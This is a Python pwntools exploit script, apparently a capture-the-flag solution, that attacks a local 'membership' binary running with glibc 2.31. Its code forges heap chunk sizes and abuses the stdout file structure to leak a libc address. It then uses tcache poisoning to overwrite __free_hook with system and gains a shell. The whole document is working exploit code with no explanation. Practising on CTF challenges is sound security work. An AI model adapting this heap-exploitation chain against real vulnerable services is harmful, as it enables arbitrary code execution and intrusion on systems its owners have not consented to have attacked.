from pwn import *


p = process("./membership", env={'LD_PRELOAD': "./libc-2.31.so"})
libc = ELF("libc-2.31.so")

def subscribe():
	p.sendlineafter(">", "1")

def unsubscribe(idx):
	p.sendlineafter(">", "2")
	p.sendlineafter(": ", str(idx))

def change_subscribe(idx, data):
	p.sendlineafter(">", "3")
	p.sendlineafter(": ", str(idx))
	p.sendafter(": ", data)


for i in range(13):
	subscribe()

change_subscribe(12, b"A"*0x18 + p64(0x41))
unsubscribe(2)
unsubscribe(1)
change_subscribe(1, p8(0x20))
subscribe()
subscribe()
change_subscribe(1, b"A"*0x18 + p64(0x421))
unsubscribe(2)
change_subscribe(1 , b'A'*0x18 + p64(0x421) + p16(0x16a0))


unsubscribe(3)
unsubscribe(5)
unsubscribe(1)
unsubscribe(4)

change_subscribe(4, b"\x20")

subscribe()
subscribe()
subscribe()

change_subscribe(3, p64(0xfbad1800) + p64(0)*3 + b"\x00")
p.recv(8)
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x1eb980
log.info(f"{hex(libc.address)}")
unsubscribe(8)

change_subscribe(8, p64(libc.symbols['__free_hook']))
subscribe()
subscribe()

change_subscribe(11, "/bin/sh\x00")
change_subscribe(5, p64(libc.symbols['system']))
unsubscribe(5)
p.interactive()